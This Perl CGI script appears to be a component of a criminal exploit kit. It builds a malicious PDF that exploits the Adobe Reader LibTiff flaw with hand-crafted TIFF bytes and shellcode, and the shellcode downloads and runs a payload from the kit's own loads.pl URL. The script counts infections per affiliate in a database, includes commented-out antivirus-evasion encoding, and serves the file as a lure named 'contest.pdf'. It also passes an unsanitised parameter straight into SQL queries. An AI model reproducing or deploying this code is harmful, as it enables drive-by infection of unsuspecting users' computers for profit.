#!/usr/bin/perl

#
# Adobe Acrobat Reader LibTiff exploit (Windows XP / Adobe Acrobat Reader 8.0 / 8.1 / 8.2 / 9.0 / 9.1 / 9.2/ 9.3)
# TESTED on Windows XP SP3 (en / fr) (adobe 9.1 / 9.2) WORKING
# NOT FUD   
#

use CGI;
use DBI;
use Compress::Zlib;
require "../config.pl";
require "../lib/Shellcode.pm";

$q = new CGI;

$aff = $q->param('aff');

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";


#Insert the view param on exploit
$sql = "UPDATE exploits SET adobelibtiff=adobelibtiff+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET adobelibtiff=adobelibtiff+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$TIFF_OFSET = 0x2038;
$SHELLCODE_OFFSET = 1500;

#build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=adobelibtiff';
$shellcode = Shellcode::pdfgetshell($urlllll);
$buf = $shellcode;

sub gen_tiff
{
  $tiff = "\x49\x49\x2a\x00";
  $tiff .= pack("L", $TIFF_OFSET);

  $tiff .= "\x90" x ($SHELLCODE_OFFSET);
  $tiff .= $buf;
  $tiff .= "\x90" x ($TIFF_OFSET - 8 - length($buf) - $SHELLCODE_OFFSET);

  $tiff .= "\x07\x00\x00\x01\x03\x00\x01\x00";
  $tiff .= "\x00\x00\x30\x20\x00\x00\x01\x01\x03\x00\x01\x00\x00\x00\x01\x00";
  $tiff .= "\x00\x00\x03\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x01";
  $tiff .= "\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x11\x01\x04\x00\x01\x00";
  $tiff .= "\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00\x01\x00\x00\x00\x30\x20";
  $tiff .= "\x00\x00\x50\x01\x03\x00\xCC\x00\x00\x00\x92\x20\x00\x00\x00\x00";
  $tiff .= "\x00\x00\x00\x0C\x0C\x08\x24\x01\x01\x00\xF7\x72\x00\x07\x04\x01";
  $tiff .= "\x01\x00\xBB\x15\x00\x07\x00\x10\x00\x00\x4D\x15\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x00\x03\xFE\x7F\xB2\x7F\x00\x07\xBB\x15\x00\x07\x11\x00";
  $tiff .= "\x01\x00\xAC\xA8\x00\x07\xBB\x15\x00\x07\x00\x01\x01\x00\xAC\xA8";
  $tiff .= "\x00\x07\xF7\x72\x00\x07\x11\x00\x01\x00\xE2\x52\x00\x07\x54\x5C";
  $tiff .= "\x00\x07\xFF\xFF\xFF\xFF\x00\x01\x01\x00\x00\x00\x00\x00\x04\x01";
  $tiff .= "\x01\x00\x00\x10\x00\x00\x40\x00\x00\x00\x31\xD7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x5A\x52\x6A\x02\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x58\xCD\x2E\x3C\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x05\x5A\x74\xF4\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xB8\x49\x49\x2A\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x00\x8B\xFA\xAF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\x75\xEA\x87\xFE\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xEB\x0A\x5F\xB9\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xE0\x03\x00\x00\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xF3\xA5\xEB\x09\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xE8\xF1\xFF\xFF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xFF\x90\x90\x90\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15";
  $tiff .= "\x00\x07\xFF\xFF\xFF\x90\x4D\x15\x00\x07\x31\xD7\x00\x07\x2F\x11";
  $tiff .= "\x00\x07";
  
  return $tiff;
}

sub gen_xml
{

$xml = <<SCREOF;
<?xml version="1.0" encoding="UTF-8" ?> 
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version> 
<interactive>1</interactive> 
<linearized>1</linearized> 
</pdf>
<xdp>
<packets>*</packets> 
</xdp>
<destination>pdf</destination> 
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="topmostSubform" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="612pt" h="792pt" /> 
<medium short="612pt" long="792pt" stock="custom" /> 
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#PageArea1" /> 
<bind match="none" /> 
<field name="ImageField1" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit /> 
</ui>
</field>
<?templateDesigner expand 1?> 
</subform>
<?templateDesigner expand 1?> 
</subform>
<?templateDesigner FormTargetVersion 24?> 
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?> 
<?templateDesigner Zoom 94?> 
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<topmostSubform>
<ImageField1 xfa:contentType="image/tif" href="">$tiff64</ImageField1> 
</topmostSubform>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" /> 
<form checksum="a5Mpguasoj4WsTUtgpdudlf4qd4=" xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="topmostSubform">
<instanceManager name="_Page1" /> 
<subform name="Page1">
<field name="ImageField1" /> 
</subform>
<pageSet>
<pageArea name="PageArea1" /> 
</pageSet>
</subform>
</form>
</xdp:xdp>
SCREOF

return $xml;
}

sub gen_pdf
{

$xmlcomp = compress($xml);
$length_xml = length($xmlcomp);

# Crypt the pdf (more Avs detect it 0_o)
#$pdf .= '%PDF-1.' . int(rand(6)) . $eol;
#$pdf .= '1 0 obj ' . $eol;
#$pdf .= '<</' . JsXOR::pdfhexencode("Filter") . ' /' . JsXOR::pdfhexencode("FlateDecode") . '/' . JsXOR::pdfhexencode("Length") . " $length_xml" . '/' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("EmbeddedFile") . '>>' . $eol;
#$pdf .= 'stream' . $eol;
#$pdf .= $xmlcomp . $eol;
#$pdf .= 'endstream ' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '2 0 obj' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("V") . ' () /' . JsXOR::pdfhexencode("Kids") . ' [3 0 R] /' . JsXOR::pdfhexencode("T") . ' (topmostSubform[0]) >>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '3 0 obj ' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("Parent") . ' 2 0 R /' . JsXOR::pdfhexencode("Kids") . ' [4 0 R] /' . JsXOR::pdfhexencode("T") . ' (Page1[0])>>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '4 0 obj' . $eol;
#$pdf .= '<</' . JsXOR::pdfhexencode("MK") . ' <</' . JsXOR::pdfhexencode("IF") . ' <</' . JsXOR::pdfhexencode("A") . ' [0.0 1.0]>>/' . JsXOR::pdfhexencode("TP") . ' 1>>/' . JsXOR::pdfhexencode("P") . ' 5 0 R/' . JsXOR::pdfhexencode("FT") . ' /' . JsXOR::pdfhexencode("Btn") . '/' . JsXOR::pdfhexencode("TU") . ' (ImageField1)/' . JsXOR::pdfhexencode("Ff") . ' 65536/' . JsXOR::pdfhexencode("Parent") . ' 3 0 R/' . JsXOR::pdfhexencode("F") . ' 4/' . JsXOR::pdfhexencode("DA") . ' (/' . JsXOR::pdfhexencode("CourierStd") . ' 10 Tf 0 g)/' . JsXOR::pdfhexencode("Subtype") . ' /' . JsXOR::pdfhexencode("Widget") . '/' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Annot") . '/' . JsXOR::pdfhexencode("T") . ' (ImageField1[0])/' . JsXOR::pdfhexencode("Rect") . ' [107.385 705.147 188.385 709.087]>>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '5 0 obj ' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("Rotate") . ' 0 /' . JsXOR::pdfhexencode("CropBox") . ' [0.0 0.0 612.0 792.0]/' . JsXOR::pdfhexencode("MediaBox") . ' [0.0 0.0 612.0 792.0]/' . JsXOR::pdfhexencode("Resources") . ' <</' . JsXOR::pdfhexencode("XObject") . ' >>/' . JsXOR::pdfhexencode("Parent") . ' 6 0 R/' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Page") . '/' . JsXOR::pdfhexencode("PieceInfo") . ' null>>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '6 0 obj ' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("Kids") . ' [5 0 R]/' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Pages") . '/' . JsXOR::pdfhexencode("Count") . ' 1>>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '7 0 obj ' . $eol;
#$pdf .= '<</' . JsXOR::pdfhexencode("PageMode") . ' /' . JsXOR::pdfhexencode("UseAttachments") . '/' . JsXOR::pdfhexencode("Pages") . ' 6 0 R/' . JsXOR::pdfhexencode("MarkInfo") . ' <</' . JsXOR::pdfhexencode("Marked") . ' true>>/' . JsXOR::pdfhexencode("Lang") . ' (en-us)/' . JsXOR::pdfhexencode("AcroForm") . ' 8 0 R/' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Catalog") . '>>' . $eol;
#$pdf .= 'endobj' . $eol; 
#$pdf .= '8 0 obj ' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("DA") . ' (/' . JsXOR::pdfhexencode("Helv") . ' 0 Tf 0 g )/' . JsXOR::pdfhexencode("XFA") . ' [(template) 1 0 R]/' . JsXOR::pdfhexencode("Fields") . ' [2 0 R]>>' . $eol;
#$pdf .= 'endobj xref' . $eol; 
#$pdf .= 'trailer' . $eol; 
#$pdf .= '<</' . JsXOR::pdfhexencode("Root") . ' 7 0 R/' . JsXOR::pdfhexencode("Size") . ' 9>>' . $eol;
#$pdf .= 'startxref' . $eol; 
#$pdf .= length($pdf) . $eol;
#$pdf .= '%%EOF';

$pdf = <<ENDPDF;
%PDF-1.6
1 0 obj 
<</Filter /FlateDecode/Length $length_xml/Type /EmbeddedFile>>
stream
$xmlcomp
endstream 
endobj 
2 0 obj 
<</V () /Kids [3 0 R] /T (topmostSubform[0]) >>
endobj 
3 0 obj 
<</Parent 2 0 R /Kids [4 0 R] /T (Page1[0])>>
endobj 
4 0 obj 
<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P 5 0 R/FT /Btn/TU (ImageField1)/Ff 65536/Parent 3 0 R/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (ImageField1[0])/Rect [107.385 705.147 188.385 709.087]>>
endobj 
5 0 obj 
<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent 6 0 R/Type /Page/PieceInfo null>>
endobj 
6 0 obj 
<</Kids [5 0 R]/Type /Pages/Count 1>>
endobj 
7 0 obj 
<</PageMode /UseAttachments/Pages 6 0 R/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm 8 0 R/Type /Catalog>>
endobj 
8 0 obj 
<</DA (/Helv 0 Tf 0 g )/XFA [(template) 1 0 R]/Fields [2 0 R]>>
endobj xref
trailer
<</Root 7 0 R/Size 9>>
startxref
ENDPDF
$pdf .= length($pdf) ."\n";
$pdf .= '%%EOF';

return $pdf;

}

sub wencode_base64 ($;$){
    use integer;
    my $eol = $_[1];
    $eol = "\n" unless defined $eol;
    my $res = pack("u", $_[0]);
    $res =~ s/^.//mg;
    $res =~ s/\n//g;
    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
    if (length $eol) {
	$res =~ s/(.{1,76})/$1$eol/g;
    }
    return $res;
}


$data = gen_tiff();
$tiff64 = wencode_base64($data);
$xml = gen_xml();
$allpdfdata = gen_pdf();

###### BEGIN PRINT EXPLOIT #########
print $q->header(-type=> 'application/pdf', "Content-Disposition: inline; filename=contest.pdf");

print $allpdfdata;


####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
